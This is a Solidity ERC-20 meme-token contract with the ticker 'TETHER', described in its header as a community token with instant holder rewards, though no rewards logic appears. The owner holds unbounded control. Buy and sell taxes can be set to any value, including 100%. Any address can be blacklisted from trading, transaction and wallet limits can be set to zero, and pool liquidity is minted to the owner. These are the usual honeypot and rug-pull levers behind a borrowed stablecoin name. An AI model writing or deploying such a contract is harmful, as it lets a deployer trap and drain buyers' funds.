/**⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    HermioneGrangerClintonAmberAmyRose9Inu (TETHER)
    is a community-focused, decentralized cryptocurrency
    with instant rewards for holders.

    Website:  https://hgcaar9i.com/
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a > b) ? b : a;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Tether is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances; // Balances
    mapping(address => mapping(address => uint256)) private _allowances; // Allowances
    mapping(address => bool) private _isExcludedFromFee; // Excluded from fees
    mapping(address => bool) private _bots; // Bots
    mapping(address => uint256) private _holderLastTransferTimestamp; // Used to prevent bots

    bool public transferDelayEnabled; // Delay transfers to prevent bots
    address payable private _taxWallet; // Marketing wallet

    address private constant _UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // UniSwap Router V2 (mainnet)

    uint256 private _initialBuyTax; // Buy tax is always lower than sell tax
    uint256 private _initialSellTax; // Sell tax is always higher than buy tax
    uint256 private _finalBuyTax; // Buy tax is always lower than sell tax
    uint256 private _finalSellTax; // Sell tax is always higher than buy tax
    uint256 public _reduceBuyTaxAt; // Number of buys before tax is reduced
    uint256 public _reduceSellTaxAt; // Number of buys before tax is reduced
    uint256 private _preventSwapBefore; // Number of buys before swap is enabled
    uint256 private _buyCount; // Number of buys since last sell

    uint8 private constant _decimals = 8;
    uint256 private constant _tTotal = 999999999999 * 10 ** _decimals; // Total supply
    string private constant _name = unicode"HermioneGrangerClintonAmberAmyRose9Inu";
    string private constant _symbol = unicode"TETHER";
    uint256 public _maxTxAmount = _tTotal; // Max transaction amount
    uint256 public _maxWalletSize = _tTotal; // Max wallet size
    uint256 public _taxSwapThreshold = 10000 * 10 ** _decimals; // Swap tokens for ETH when this many tokens are in contract
    uint256 public _maxTaxSwap = _tTotal; // Max tokens to swap for ETH

    IUniswapV2Router02 private uniswapV2Router; // Uniswap V2 router
    address private uniswapV2Pair; // Uniswap V2 pair
    bool private tradingOpen; // Trading is enabled after launch
    bool private inSwap; // Prevents swapping before liquidity is added
    bool private swapEnabled; // Swap enabled

    // events for setters
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event MaxWalletSizeUpdated(uint _maxWalletSize);
    event TaxSwapThresholdUpdated(uint _taxSwapThreshold);
    event MaxTaxSwapUpdated(uint _maxTaxSwap);
    event TaxWalletUpdated(address _taxWallet);
    event InitialBuyTaxUpdated(uint _initialBuyTax);
    event InitialSellTaxUpdated(uint _initialSellTax);
    event FinalBuyTaxUpdated(uint _finalBuyTax);
    event FinalSellTaxUpdated(uint _finalSellTax);
    event ReduceBuyTaxAtUpdated(uint _reduceBuyTaxAt);
    event ReduceSellTaxAtUpdated(uint _reduceSellTaxAt);
    event PreventSwapBeforeUpdated(uint _preventSwapBefore);
    event TransferDelayEnabledUpdated(bool _enabled);
    event SwapAndLiquifyEnabledUpdated(bool _enabled);
    event MinTokensBeforeSwapUpdated(uint _minTokensBeforeSwap);
    event BuybackMultiplierActive(uint256 duration);
    event BuybackMultiplierRemoved();

    event ExcludeFromFee(address indexed account);
    event IncludeInFee(address indexed account);

    constructor() {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        transferDelayEnabled = false;
        _reduceSellTaxAt = 20;
        _reduceBuyTaxAt = 20;
        emit MaxTxAmountUpdated(_tTotal);
    }

    // Setters
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner {
        _maxTxAmount = maxTxAmount;
        emit MaxTxAmountUpdated(maxTxAmount);
    }

    function setMaxWalletSize(uint256 maxWalletSize) external onlyOwner {
        _maxWalletSize = maxWalletSize;
        emit MaxWalletSizeUpdated(maxWalletSize);
    }

    function setTaxSwapThreshold(uint256 taxSwapThreshold) external onlyOwner {
        _taxSwapThreshold = taxSwapThreshold;
        emit TaxSwapThresholdUpdated(taxSwapThreshold);
    }

    function setMaxTaxSwap(uint256 maxTaxSwap) external onlyOwner {
        _maxTaxSwap = maxTaxSwap;
        emit MaxTaxSwapUpdated(maxTaxSwap);
    }

    function setTaxWallet(address payable taxWallet) external onlyOwner {
        _taxWallet = taxWallet;
        _isExcludedFromFee[taxWallet] = true;
        emit TaxWalletUpdated(taxWallet);
    }

    function setInitialBuyTax(uint256 initialBuyTax) external onlyOwner {
        _initialBuyTax = initialBuyTax;
        emit InitialBuyTaxUpdated(initialBuyTax);
    }

    function setInitialSellTax(uint256 initialSellTax) external onlyOwner {
        _initialSellTax = initialSellTax;
        emit InitialSellTaxUpdated(initialSellTax);
    }

    function setFinalBuyTax(uint256 finalBuyTax) external onlyOwner {
        _finalBuyTax = finalBuyTax;
        emit FinalBuyTaxUpdated(finalBuyTax);
    }

    function setFinalSellTax(uint256 finalSellTax) external onlyOwner {
        _finalSellTax = finalSellTax;
        emit FinalSellTaxUpdated(finalSellTax);
    }

    function setReduceBuyTaxAt(uint256 reduceBuyTaxAt) external onlyOwner {
        _reduceBuyTaxAt = reduceBuyTaxAt;
        emit ReduceBuyTaxAtUpdated(reduceBuyTaxAt);
    }

    function setReduceSellTaxAt(uint256 reduceSellTaxAt) external onlyOwner {
        _reduceSellTaxAt = reduceSellTaxAt;
        emit ReduceSellTaxAtUpdated(reduceSellTaxAt);
    }

    function setPreventSwapBefore(uint256 preventSwapBefore) external onlyOwner {
        _preventSwapBefore = preventSwapBefore;
        emit PreventSwapBeforeUpdated(preventSwapBefore);
    }

    function setTransferDelayEnabled(bool _enabled) external onlyOwner {
        transferDelayEnabled = _enabled;
        emit TransferDelayEnabledUpdated(_enabled);
    }

    // functions exclude/include from fee
    function excludeFromFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = true;
        emit ExcludeFromFee(account);
    }

    function includeInFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = false;
        emit IncludeInFee(account);
    }

    function gottagofast() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(_UNISWAP_ROUTER);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            _swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            _sendETHToFee(ethBalance);
        }
    }

    function addBots(address[] calldata bots_) external onlyOwner {
        for (uint256 i; i < bots_.length; ) {
            _bots[bots_[i]] = true;
            unchecked {
                ++i;
            }
        }
    }

    function delBots(address[] calldata notbot) external onlyOwner {
        for (uint256 i; i < notbot.length; ) {
            _bots[notbot[i]] = false;
            unchecked {
                ++i;
            }
        }
    }

    function isBot(address a) public view returns (bool) {
        return _bots[a];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            require(!_bots[from] && !_bots[to]);

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) {
                    require(
                        _holderLastTransferTimestamp[tx.origin] < block.number,
                        "Only one transfer per block allowed."
                    );
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            taxAmount = amount.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax).div(100);
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
            to == uniswapV2Pair &&
            swapEnabled &&
            contractTokenBalance > _taxSwapThreshold &&
            _buyCount > _preventSwapBefore
            ) {
                _swapTokensForEth(SafeMath.min(amount, SafeMath.min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    _sendETHToFee(address(this).balance);
                }
            }
        }
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }
        if (!tradingOpen) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
}